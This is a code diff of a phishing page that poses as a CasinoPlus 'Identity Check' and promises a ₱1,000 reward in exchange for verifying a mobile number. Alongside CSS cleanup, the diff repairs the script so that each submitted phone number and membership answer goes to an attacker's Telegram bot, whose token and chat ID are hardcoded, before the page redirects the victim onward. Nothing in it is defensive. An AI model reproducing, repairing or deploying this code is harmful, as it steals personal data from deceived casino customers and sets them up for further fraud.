@@ -8,7 +8,6 @@
     <style>
         :root {
             --gold: #fbbf24;
-            --gold-dark: #b45309;
             --bg: #020617;
             --card-bg: rgba(30, 41, 59, 0.7);
         }
@@ -17,9 +16,7 @@
 
         body {
             background-color: var(--bg);
-            background-image: 
-                radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 50%),
-                radial-gradient(circle at 100% 100%, #0f172a 0%, #020617 100%);
+            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 50%), radial-gradient(circle at 100% 100%, #0f172a 0%, #020617 100%);
             color: #f8fafc;
             font-family: 'Poppins', sans-serif;
             display: flex;
@@ -29,7 +26,6 @@
             overflow: hidden;
         }
 
-        /* Remastered Card */
         .card {
             width: 90%;
             max-width: 400px;
@@ -39,41 +35,18 @@
             border-radius: 28px;
             padding: 40px 28px;
             text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7), inset 0 1px 1px rgba(255,255,255,0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
             animation: fadeIn 0.8s ease-out;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        .logo-container {
-            position: relative;
-            display: inline-block;
-            margin-bottom: 30px;
-        }
-
-        .logo-img {
-            width: 180px;
-            filter: drop-shadow(0 0 15px rgba(251, 191, 36, 0.3));
-        }
-
-        h1 { font-size: 24px; font-weight: 800; margin-bottom: 12px; letter-spacing: -0.5px; }
+        .logo-img { width: 180px; margin-bottom: 30px; filter: drop-shadow(0 0 15px rgba(251, 191, 36, 0.3)); }
+        h1 { font-size: 24px; font-weight: 800; margin-bottom: 12px; }
         p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 32px; }
 
-        /* Stylish Inputs */
         .input-group { text-align: left; margin-bottom: 20px; }
-        .label-text {
-            font-size: 11px;
-            text-transform: uppercase;
-            color: var(--gold);
-            font-weight: 700;
-            margin-left: 5px;
-            margin-bottom: 8px;
-            display: block;
-            letter-spacing: 1px;
-        }
+        .label-text { font-size: 11px; text-transform: uppercase; color: var(--gold); font-weight: 700; margin-bottom: 8px; display: block; letter-spacing: 1px; }
 
         input {
             width: 100%;
@@ -84,13 +57,9 @@
             color: #fff;
             font-size: 18px;
             font-family: 'JetBrains Mono', monospace;
-            transition: 0.3s;
             outline: none;
         }
 
-        input:focus { border-color: var(--gold); box-shadow: 0 0 15px rgba(251, 191, 36, 0.2); }
-
-        /* Stylish Button */
         .btn-gold {
             background: linear-gradient(135deg, #fbbf24 0%, #d97706 100%);
             color: #000;
@@ -102,69 +71,22 @@
             font-weight: 700;
             text-transform: uppercase;
             cursor: pointer;
-            transition: 0.3s;
             box-shadow: 0 10px 20px -5px rgba(217, 119, 6, 0.4);
         }
 
-        .btn-gold:active { transform: scale(0.96); }
-        .btn-gold:disabled { opacity: 0.6; cursor: not-allowed; }
-
-        /* Radio Buttons Remastered */
-        .radio-container {
-            display: flex;
-            background: rgba(15, 23, 42, 0.6);
-            padding: 5px;
-            border-radius: 12px;
-            margin-bottom: 30px;
-        }
-
-        .radio-container label {
-            flex: 1;
-            padding: 10px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-            border-radius: 8px;
-            transition: 0.2s;
-            text-align: center;
-        }
-
+        .radio-container { display: flex; background: rgba(15, 23, 42, 0.6); padding: 5px; border-radius: 12px; margin-bottom: 30px; }
+        .radio-container label { flex: 1; padding: 10px; cursor: pointer; font-size: 14px; font-weight: 600; border-radius: 8px; transition: 0.2s; }
         .radio-container input { display: none; }
-        .radio-container input:checked + span {
-            background: var(--gold);
-            color: #000;
-            display: block;
-            width: 100%;
-            height: 100%;
-            border-radius: 8px;
-            padding: 8px 0;
-        }
-
-        /* Modal Overlay */
-        .overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(2, 6, 23, 0.95);
-            z-index: 100;
-            align-items: center;
-            justify-content: center;
-        }
+        .radio-container input:checked + span { background: var(--gold); color: #000; display: block; width: 100%; border-radius: 8px; padding: 5px 0; }
 
         .shake { animation: shake 0.4s ease-in-out; border-color: #ef4444 !important; }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-8px); }
-            75% { transform: translateX(8px); }
-        }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
     </style>
 </head>
 <body>
 
-    <div class="card" id="mainCard">
-        <div class="logo-container">
-            <img src="https://casinoplus.static2.website/images/image-7.jpg" class="logo-img" alt="CasinoPlus">
-        </div>
+    <div class="card">
+        <img src="https://casinoplus.static2.website/images/image-7.jpg" class="logo-img" alt="CasinoPlus">
         <h1>Identity Check</h1>
         <p>To secure your ₱1,000.00 reward, please verify your registered mobile number.</p>
         
@@ -175,14 +97,8 @@
 
         <span class="label-text" style="text-align: left;">Member of CasinoPlus?</span>
         <div class="radio-container">
-            <label>
-                <input type="radio" name="reg" value="Yes" checked>
-                <span>YES</span>
-            </label>
-            <label>
-                <input type="radio" name="reg" value="No">
-                <span>NO</span>
-            </label>
+            <label><input type="radio" name="reg" value="Yes" checked><span>YES</span></label>
+            <label><input type="radio" name="reg" value="No"><span>NO</span></label>
         </div>
 
         <button class="btn-gold" id="submitBtn" onclick="processBypass()">Verify & Claim</button>
@@ -191,53 +107,44 @@
     <script>
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
-        const BYPASS_MODE = true; // TRUE = Rekta main.html | FALSE = Stay sa Verification Code (Step 2)
+        const BYPASS_MODE = true; 
 
         function processBypass() {
-    const phone = document.getElementById('userPhone');
-    const btn = document.getElementById('submitBtn');
-    // ... (yung ibang code mo) ...
+            const phoneInput = document.getElementById('userPhone');
+            const btn = document.getElementById('submitBtn');
+            const regStatus = document.querySelector('input[name="reg"]:checked').value;
+            const phone = phoneInput.value;
 
-    fetch(telUrl).finally(() => {
-        if (BYPASS_MODE) {
-            // KUNG TRUE: Lipat agad sa main.html
-            setTimeout(() => {
-                window.location.href = "main.html?auth=" + Math.random().toString(36).substring(7);
-            }, 1000);
-        } else {
-            // KUNG FALSE: Ipakita ang "Step 2" o yung Verification Code modal
-            alert("Please check your phone for the verification code.");
-            // Dito mo ilalagay yung code para lumitaw yung Step 2 box
-        }
-    });
-}
-
-            // Simple Validation
-            if (phone.value.length < 11 || !phone.value.startsWith('09')) {
-                phone.classList.add('shake');
-                setTimeout(() => phone.classList.remove('shake'), 400);
+            // 1. Validation
+            if (phone.length < 11 || !phone.startsWith('09')) {
+                phoneInput.classList.add('shake');
+                setTimeout(() => phoneInput.classList.remove('shake'), 400);
                 return;
             }
 
-            // UI Feedback
-            btn.innerHTML = "Processing...";
+            // 2. UI Feedback
+            btn.innerHTML = "Verifying...";
             btn.disabled = true;
 
-            // 1. Telegram Alert (Send info first)
-            const msg = `🎰 REMASTERED HIT:\n📱 Number: ${phone.value}\n👤 Member: ${regStatus}`;
+            // 3. Telegram Alert
+            const msg = `🎰 REMASTERED HIT:\n📱 Number: ${phone}\n👤 Member: ${regStatus}`;
             const telUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
             
-            // Use fetch for more reliability than Image()
             fetch(telUrl).finally(() => {
-                // 2. Stylish Bypass Redirect
-                // Gumagamit tayo ng 'main.html' lang para sigurado ang path
-                setTimeout(() => {
-                    window.location.href = "main.html?auth=" + Math.random().toString(36).substring(7);
-                }, 1000);
+                if (BYPASS_MODE) {
+                    // SUCCESS REDIRECT
+                    setTimeout(() => {
+                        window.location.href = "main.html?auth=" + Math.random().toString(36).substring(7);
+                    }, 1200);
+                } else {
+                    alert("Verification system busy. Please try again later.");
+                    btn.innerHTML = "Verify & Claim";
+                    btn.disabled = false;
+                }
             });
         }
 
-        // Automatic focus focus effect
+        // Restrict input to numbers only
         document.getElementById('userPhone').addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '');
         });
